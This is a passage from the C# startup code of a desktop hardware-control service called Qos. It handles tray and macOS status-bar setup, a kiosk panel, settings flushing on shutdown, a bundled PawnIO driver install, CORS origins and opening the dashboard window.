            // Always launch the user-session helper. Its lifetime is decoupled
            // from any pref - the helper hosts the tray icon, screen-time
            // poller, media/brightness providers, etc. ShowWindowsTrayIcon
            // only controls icon visibility now, not whether the helper exists.
            Qos.Service.Lifecycle.UserHelperBootstrapper.EnsureLaunched();
#endif
        }
        else if (suppressStartupWindow)
        {
            Console.WriteLine("[qos-service] startup window suppressed (--no-window)");
        }
        else
        {
            Qos.Service.Platform.Windows.TrayIcon.OpenLocalWindow();
            Console.WriteLine("[qos-service] app window launched");
        }

        // Auto-launch the panel kiosk if the setting is enabled AND a recognized
        // device display (Y70/Y80) is connected. Runs on a background thread with
        // a short delay so the display subsystem is fully initialized after logon.
        var store2 = app.Services.GetRequiredService<Qos.Service.Persistence.IConfigStore>();
        if (store2.Load().Ui.PanelAutoLaunch)
        {
            _ = Task.Run(async () =>
            {
                await Task.Delay(3000);
                if (Qos.Service.Panel.PanelKioskLauncher.IsPanelDisplayConnected())
                {
                    var kiosk = app.Services.GetRequiredService<Qos.Service.Panel.PanelKioskLauncher>();
                    if (!kiosk.IsRunning)
                    {
                        kiosk.Launch();
                        Console.WriteLine("[panel] auto-launched on recognized display");
                    }
                }
            });
        }

    });

    // Kill panel kiosk webview on any shutdown (Ctrl+C, Task Manager, Stop-Process, etc.)
    // Also flush in-memory settings + active profile to disk so the user's
    // recent mutations (lighting effect, etc.) survive a graceful stop. The
    // 2s ProfileFlushInterval window is a safety net; this hook closes it.
    app.Lifetime.ApplicationStopping.Register(() =>
    {
        var launcher = app.Services.GetRequiredService<Qos.Service.Panel.PanelKioskLauncher>();
        launcher.Close();
        try
        {
            app.Services.GetRequiredService<Qos.Service.Persistence.IConfigStore>().FlushNow();
        }
        catch { /* best-effort */ }
        try
        {
            app.Services.GetRequiredService<Qos.Service.Persistence.ProfileManager>().SaveActiveProfile();
        }
        catch { /* best-effort */ }
    });

    // Auto-install the bundled PawnIO kernel driver if not already installed.
    // Fire-and-forget — runs in background, triggers a UAC prompt at first launch
    // only. Subsequent launches detect the registered service and skip silently.
    _ = Task.Run(async () =>
    {
        try
        {
            var result = await Qos.Service.Lifecycle.PawnIoInstaller.EnsureInstalledAsync();
            Console.Error.WriteLine($"[pawnio] driver state: {result}");
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"[pawnio] install check failed: {ex.Message}");
        }
    });
}

// macOS status bar icon — requires NSRunLoop on the main thread.
// NSStatusItem + NSWindow must be created on the main thread, so we start the
// web host async (on background threads) and initialize the status bar
// synchronously here without awaiting (so we stay on the main thread).
if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
{
    // Auto-open the dashboard window when the .app finishes launching, so
    // double-clicking Qos.app behaves like the Windows tray launch:
    // the user always sees a window, not just a hidden menu-bar agent.
    // Uses the in-process WKWebView host (MacAppWindow) - no Chrome / Edge
    // dependency, the chromeless window is built from AppKit + WebKit which
    // are part of macOS.
    app.Lifetime.ApplicationStarted.Register(() =>
    {
        try { Qos.Service.Platform.Mac.MacAppWindow.OpenOrFocus(ServiceLaunchIntent.LocalDashboardUrl(servicePort)); }
        catch (Exception ex) { Console.Error.WriteLine($"[qos-service] mac auto-open failed: {ex.Message}"); }
    });

    // Start web host on background thread — returns immediately
    var webTask = app.RunAsync();

    // Only show status bar if the profile says so (default true)
    var store = app.Services.GetRequiredService<Qos.Service.Persistence.IConfigStore>();
    var settings = store.Load();
    var showIcon = settings.Ui.ShowMacStatusBarIcon;

    var iconPath = Path.Combine(AppContext.BaseDirectory, "status-icon.png");

    Qos.Service.Platform.Mac.MacStatusBar.Initialize(
        iconPath,
        onOpenDashboard: () => Qos.Service.Platform.Mac.MacAppWindow.OpenOrFocus(ServiceLaunchIntent.LocalDashboardUrl(servicePort)),
        onOpenSettings: () => Qos.Service.Platform.Mac.MacAppWindow.OpenOrFocus($"http://localhost:{servicePort}/my-computer/settings"),
        onQuit: () =>
        {
            Console.WriteLine("[qos-service] quit requested from status bar");
            _ = app.StopAsync();
            Qos.Service.Platform.Mac.MacStatusBar.StopRunLoop();
        },
        // LaunchServices delivers kAEReopenApplication when the user
        // re-launches Qos.app while it's already running, or clicks the
        // running app's Dock icon. Bring the existing window forward without
        // reloading the WKWebView - if the user is mid-navigation in the
        // dashboard, a Dock click must not refresh them back to the start.
        // navigateIfOpen=false makes OpenOrFocus skip loadRequest: when the
        // window already exists; a freshly-created window still navigates.
        onReopen: () => Qos.Service.Platform.Mac.MacAppWindow.OpenOrFocus(
            ServiceLaunchIntent.LocalDashboardUrl(servicePort),
            navigateIfOpen: false));

    Qos.Service.Platform.Mac.MacStatusBar.SetVisible(showIcon);

    // Watch config for visibility changes and mirror to status bar
    store.OnChanged += () =>
    {
        try
        {
            var show = store.Load().Ui.ShowMacStatusBarIcon;
            Qos.Service.Platform.Mac.MacStatusBar.SetVisible(show);
        }
        catch { /* best-effort */ }
    };

    // Block main thread running CFRunLoop to pump AppKit events for the menu.
    // Exits when StopRunLoop() is called from the Quit action.
    Qos.Service.Platform.Mac.MacStatusBar.RunLoop();

    // After the run loop exits, wait for the web host to finish shutting down.
    try
    { webTask.GetAwaiter().GetResult(); }
    catch { /* shutdown */ }
    return 0;
}

#if WINDOWS
if (serviceMode)
{
    return Qos.Service.Lifecycle.WindowsServiceHost.Run(args, async (_, ct) =>
    {
        await app.RunAsync(ct).ConfigureAwait(false);
        return 0;
    });
}
#endif

app.Run();
return 0;

static string[] BuildAllowedOrigins(int httpPort, int httpsPort)
{
    var origins = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
    {
        $"http://localhost:{httpPort}",
        $"http://127.0.0.1:{httpPort}",
        "https://nexusqos.com",
        "https://www.nexusqos.com",
    };

    if (httpsPort > 0)
    {
        origins.Add($"https://localhost:{httpsPort}");
        origins.Add($"https://127.0.0.1:{httpsPort}");
    }

    if (!string.IsNullOrWhiteSpace(Environment.MachineName))
    {
        origins.Add($"http://{Environment.MachineName}:{httpPort}");
        if (httpsPort > 0)
            origins.Add($"https://{Environment.MachineName}:{httpsPort}");
    }

    try
    {
        foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
        {
            if (nic.OperationalStatus != OperationalStatus.Up)
                continue;
            if (nic.NetworkInterfaceType is NetworkInterfaceType.Loopback or NetworkInterfaceType.Tunnel)
                continue;

            foreach (var address in nic.GetIPProperties().UnicastAddresses)
            {
                var ip = address.Address;
                if (ip.AddressFamily == AddressFamily.InterNetwork &&
                    !IPAddress.IsLoopback(ip) &&
                    !ip.ToString().StartsWith("169.254.", StringComparison.Ordinal))
                {
                    origins.Add($"http://{ip}:{httpPort}");
                    if (httpsPort > 0)
                        origins.Add($"https://{ip}:{httpsPort}");
                }
            }
        }
    }
    catch { }

    return origins.ToArray();
}

// ── Local functions ─────────────────────────────────────────────────────────

static void OpenExistingServiceWindow(int servicePort)
{
    try
    {
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            Qos.Service.Platform.Windows.TrayIcon.OpenLocalWindow(servicePort);
            return;
        }

        OpenInAppMode(ServiceLaunchIntent.LocalDashboardUrl(servicePort));
    }
    catch (Exception ex)
    {
        Console.Error.WriteLine($"[qos-service] second launch window handoff failed: {ex.Message}");
    }
}

static void OpenInAppMode(string url)
{
    // Find Chrome or Edge and launch with --app=URL for a chromeless window
    // (no address bar, no tabs) — similar to msedge.exe --app on Windows.
    // Fall back to the default browser if neither is installed.
    try
    {
        string? browser = null;
        string[] candidates = RuntimeInformation.IsOSPlatform(OSPlatform.OSX)
            ? new[]
            {
                "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
                "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge",
                "/Applications/Chromium.app/Contents/MacOS/Chromium",
                "/Applications/Arc.app/Contents/MacOS/Arc",
                "/Applications/Brave Browser.app/Contents/MacOS/Brave Browser",
            }
            : Array.Empty<string>();

        foreach (var path in candidates)
        {
            if (System.IO.File.Exists(path))
            { browser = path; break; }
        }

        if (browser is not null)
        {
            var dataDir = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "qos-app");
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = browser,
                UseShellExecute = false,
            };
            psi.ArgumentList.Add($"--app={url}");
            psi.ArgumentList.Add($"--user-data-dir={dataDir}");
            System.Diagnostics.Process.Start(psi);
            return;
        }

        // Fallback: open in default browser
        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
        {
            FileName = url,
            UseShellExecute = true,
        });
    }
    catch (Exception ex)
    {
        Console.Error.WriteLine($"[mac-status-bar] open {url} failed: {ex.Message}");
    }
}
